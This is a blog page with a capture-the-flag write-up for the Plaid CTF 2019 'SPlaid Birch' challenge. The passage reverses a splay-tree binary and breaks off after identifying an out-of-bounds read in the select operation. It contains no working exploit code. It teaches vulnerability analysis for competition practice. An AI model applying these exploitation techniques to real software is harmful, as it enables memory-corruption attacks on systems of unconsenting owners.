<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>SPlaid Birch -- Plaid CTF 2019 | Pedro Bernardo</title><meta name="generator" content="Jekyll v4.0.0" /><meta property="og:title" content="SPlaid Birch – Plaid CTF 2019" /><meta name="author" content="Pedro Bernardo" /><meta property="og:locale" content="en_US" /><meta name="description" content="With jofra" /><meta property="og:description" content="With jofra" /><link rel="canonical" href="http://localhost:4000/posts/PlaidCTF19_splaid_birch/" /><meta property="og:url" content="http://localhost:4000/posts/PlaidCTF19_splaid_birch/" /><meta property="og:site_name" content="Pedro Bernardo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-04-19T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SPlaid Birch – Plaid CTF 2019" /><meta name="twitter:site" content="@bl4ck_pwn" /><meta name="twitter:creator" content="@Pedro Bernardo" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"http://localhost:4000/posts/PlaidCTF19_splaid_birch/","dateModified":"2019-04-19T00:00:00+08:00","datePublished":"2019-04-19T00:00:00+08:00","headline":"SPlaid Birch – Plaid CTF 2019","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/PlaidCTF19_splaid_birch/"},"author":{"@type":"Person","name":"Pedro Bernardo"},"description":"With jofra","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">Pedro Bernardo</a></div><div id="site-subtitle" class="font-italic">Computer Science MsC student. CyberSec enthusiast and CTF player.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>WORK</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex justify-content-around mt-4"> <span id="mode-toggle-wrapper" class="d-flex justify-content-center align-items-center"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" light-mode-invisible></i> <i class="mode-toggle fas fa-moon" dark-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isDarkPrefer) { this.setDark(); } } else { if (this.isDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isDarkPrefer) { self.setDark(); } } else { if (self.isDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isDarkPrefer() { return this.sysDarkPrefers.matches; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) { this.setLight(); } else { /* light mode or default-light */ this.setDark(); } } } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <a href="https://github.com/pedro-bernardo" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bl4ck_pwn" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['pedro.m.s.bernardo','tecnico.ulisboa.pt'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><div id="main-wrapper"> <!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>SPlaid Birch -- Plaid CTF 2019</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <a href="javascript:;">Cancel</a></div></div><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"> <!-- Define the liquid date formats. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SPlaid Birch -- Plaid CTF 2019</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago" data-toggle="tooltip" title="Fri, Apr 19, 2019, 12:00 AM +0800"> Apr 19, 2019 <i class="unloaded">2019-04-19T00:00:00+08:00</i> </span> on <a href='/categories/ctf-writeups/'>CTF Writeups</a></div></div><div class="post-content"><p>With <a href="https://twitter.com/V_jofra">jofra</a></p><p><strong>Points:</strong> 300 <strong>Solves:</strong> 41 <strong>Description:</strong></p><blockquote><p>I make sure never to use</p><p>scanf(“%s”)</p><p>when doing competitive programming so that my solutions don’t have buffer overflows. But writing algorithms is hard.</p></blockquote><h2 id="recon">Recon</h2><p>We are given an ELF 64-bit x86/64 stripped binary, a libc and an external library lisplaid.so.1. After reversing this library a bit, we realized that it is an implementation of <strong>Splay Trees</strong>.</p><p>From wikipedia:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>A splay tree is a self-balancing binary search tree
with the additional property that recently accessed
elements are quick to access again.
</pre></table></code></div></div><p>Basically, this is done by making the last accessed node the root of the tree. This operation is called <strong>splaying</strong>.</p><h2 id="reversing-the-binary">Reversing the binary</h2><p>Running checksec on the binary gives us the following:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>checksec splaid-birch
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/bl4ck/WiP/pwn/splaid-birch/splaid-birch'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

</pre></table></code></div></div><p>Looking at the binary, we identified the following structures:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">sp_tree</span> <span class="p">{</span>
  <span class="n">sp_node</span> <span class="o">*</span><span class="n">root_node</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">func_1</span><span class="p">;</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func_2</span><span class="p">)(</span><span class="n">sp_node</span> <span class="o">*</span><span class="p">);</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">func_3</span><span class="p">;</span>
  <span class="kt">int64_t</span> <span class="n">allocated_sz</span><span class="p">;</span>
  <span class="kt">int64_t</span> <span class="n">sz</span><span class="p">;</span>
  <span class="n">super_node</span> <span class="o">**</span><span class="n">nodes</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">sp_node</span> <span class="p">{</span>
  <span class="n">sp_node</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
  <span class="n">sp_node</span> <span class="o">*</span><span class="n">left</span><span class="p">;</span>
  <span class="n">sp_node</span> <span class="o">*</span><span class="n">right</span><span class="p">;</span>
  <span class="kt">int64_t</span> <span class="n">sz</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">super_node</span>
<span class="p">{</span>
  <span class="kt">int64_t</span> <span class="n">node_val</span><span class="p">;</span>
  <span class="kt">int64_t</span> <span class="n">node_val_2</span><span class="p">;</span>
  <span class="cm">/* unknown fields */</span>
  <span class="kt">int64_t</span> <span class="n">unk_4</span><span class="p">;</span>
  <span class="kt">int64_t</span> <span class="n">unk_1</span><span class="p">;</span>
  <span class="cm">/* ============== */</span>
  <span class="kt">int64_t</span> <span class="n">node_i</span><span class="p">;</span>
  <span class="n">sp_node</span> <span class="n">node</span><span class="p">;</span>
<span class="p">};</span>
</pre></table></code></div></div><p>In the main function, an <code class="highlighter-rouge">sp_tree</code> struct is created on the stack and initialized like so:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>  <span class="n">sp_tree</span> <span class="n">tree</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">root_node</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">func_1</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">func_2</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">func_3</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">sz</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">allocated_sz</span> <span class="o">=</span> <span class="mh">0xALL</span><span class="p">;</span>
  <span class="n">tree</span><span class="p">.</span><span class="n">nodes</span> <span class="o">=</span> <span class="p">(</span><span class="n">super_node</span> <span class="o">**</span><span class="p">)</span><span class="n">malloc_</span><span class="p">(</span><span class="mh">0x50uLL</span><span class="p">);</span>

  <span class="cm">/* libsplaid.so.1 function */</span>
  <span class="n">sp_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">func_3</span><span class="p">,</span> <span class="n">func_1</span><span class="p">,</span> <span class="n">func_2</span><span class="p">);</span>
</pre></table></code></div></div><p>func_1 func_2 and func_3 are defined in the binary, and serve as comparators for the operations performed by the Splay Tree implementation.</p><p>The program then takes our input as unsigned longs and assigns it to the variables op, v3, v5 and v6. Then, it runs it through the following switch statement:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">op</span> <span class="p">){</span>
      <span class="k">case</span> <span class="mi">5uLL</span><span class="p">:</span>
        <span class="n">op_5_add_node</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">1uLL</span><span class="p">:</span>
        <span class="n">op_1_del_node</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2uLL</span><span class="p">:</span>
        <span class="n">v7</span> <span class="o">=</span> <span class="n">op_2_get</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
        <span class="n">print_nr</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3uLL</span><span class="p">:</span>
        <span class="n">v8</span> <span class="o">=</span> <span class="n">op_3_nth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
        <span class="n">print_nr</span><span class="p">(</span><span class="n">v8</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4uLL</span><span class="p">:</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="n">op_4_select</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
        <span class="n">print_nr</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">6uLL</span><span class="p">:</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">op_6_isolate_1</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
        <span class="n">print_nr</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">v10</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">7uLL</span><span class="p">:</span>
        <span class="n">op_7_isolate_2</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">0uLL</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
        <span class="n">v12</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v14</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
      <span class="nl">default:</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="err">}</span>
</pre></table></code></div></div><p>There are three important functions to look at: 1.<code class="highlighter-rouge">op_1_del_node</code> 2.<code class="highlighter-rouge">op_4_select</code> 3.<code class="highlighter-rouge">op_5_add_node</code></p><p><code class="highlighter-rouge">op_1_del_node</code> simply calls <code class="highlighter-rouge">sp_del</code> with the provided <code class="highlighter-rouge">node_val</code> and then uses it to find and free the corresponding node in the tree.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">op_1_del_node</span><span class="p">(</span><span class="n">sp_tree</span> <span class="o">*</span><span class="n">tree</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">node_i_to_del</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">sp_del</span><span class="p">(</span><span class="n">tree</span><span class="p">,</span> <span class="n">node_i_to_del</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">tree</span><span class="o">-&gt;</span><span class="n">nodes</span><span class="p">[</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">free</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">-</span> <span class="mi">40</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The <code class="highlighter-rouge">op_5_add_node</code> function checks the amount of nodes added so far. If this amount matches the currently allocated size, then a realloc is performed on the <code class="highlighter-rouge">tree-&gt;nodes</code> array and with double it’s original size. If there is no free space adjacent to the buffer that’s being reallocated, it will free the previous buffer and allocate a new one, with the specified size. The contents of the previous buffer are then copied to the new one. This will be handy for our exploit.</p><p>Also, if <code class="highlighter-rouge">sp_add</code> does not successfully add the new node, it will be freed. One of the ways <code class="highlighter-rouge">sp_add</code> can fail is by adding a node with a <code class="highlighter-rouge">node-&gt;node_val</code> equal to another node already on the tree.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">op_5_add_node</span><span class="p">(</span><span class="n">sp_tree</span> <span class="o">*</span><span class="n">tree</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span>
  <span class="n">super_node</span> <span class="o">*</span><span class="n">new_node</span><span class="p">;</span>
  <span class="kt">int64_t</span> <span class="n">v6</span><span class="p">;</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
  <span class="n">new_node</span> <span class="o">=</span> <span class="p">(</span><span class="n">super_node</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc_</span><span class="p">(</span><span class="mh">0x48uLL</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">tree</span><span class="o">-&gt;</span><span class="n">sz</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="n">tree</span><span class="o">-&gt;</span><span class="n">allocated_sz</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">tree</span><span class="o">-&gt;</span><span class="n">allocated_sz</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v6</span><span class="p">;</span>
    <span class="n">tree</span><span class="o">-&gt;</span><span class="n">nodes</span> <span class="o">=</span> <span class="p">(</span><span class="n">super_node</span> <span class="o">**</span><span class="p">)</span><span class="n">realloc_</span><span class="p">(</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">nodes</span><span class="p">,</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">v6</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">new_node</span><span class="o">-&gt;</span><span class="n">node_i</span> <span class="o">=</span> <span class="n">tree</span><span class="o">-&gt;</span><span class="n">sz</span><span class="p">;</span>
  <span class="n">new_node</span><span class="o">-&gt;</span><span class="n">node_val</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
  <span class="n">new_node</span><span class="o">-&gt;</span><span class="n">node_val_2</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="n">new_node</span><span class="o">-&gt;</span><span class="n">unk_4</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">sp_add</span><span class="p">(</span><span class="n">tree</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_node</span><span class="o">-&gt;</span><span class="n">node</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">tree</span><span class="o">-&gt;</span><span class="n">nodes</span><span class="p">[</span><span class="n">new_node</span><span class="o">-&gt;</span><span class="n">node_i</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_node</span><span class="p">;</span>
    <span class="o">++</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">sz</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">new_node</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Given this, we have pretty much full control over the operations performed on the tree.</p><h2 id="vulnerability">Vulnerability</h2><p>Let’s look at the <code class="highlighter-rouge">op_4_select</code> function:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>      <span class="c1">// (...)</span>
      <span class="k">case</span> <span class="mi">4uLL</span><span class="p">:</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="n">op_4_select</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tree</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
        <span class="n">print_nr</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span> <span class="c1">// node-&gt;node_val_2 is printed</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="c1">// (...)</span>
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kt">int64_t</span> <span class="kr">__fastcall</span> <span class="nf">op_4_select</span><span class="p">(</span><span class="n">sp_tree</span> <span class="o">*</span><span class="n">tree</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">node_idx</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">super_node</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rbx@1</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">tree</span><span class="o">-&gt;</span><span class="n">nodes</span><span class="p">[</span><span class="n">node_idx</span><span class="p">];</span> <span class="c1">// OOBR here</span>
  <span class="n">sp_select</span><span class="p">(</span><span class="n">tree</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">node</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">node_val_2</span><span class="p">;</span>
<span class="p">}</span>
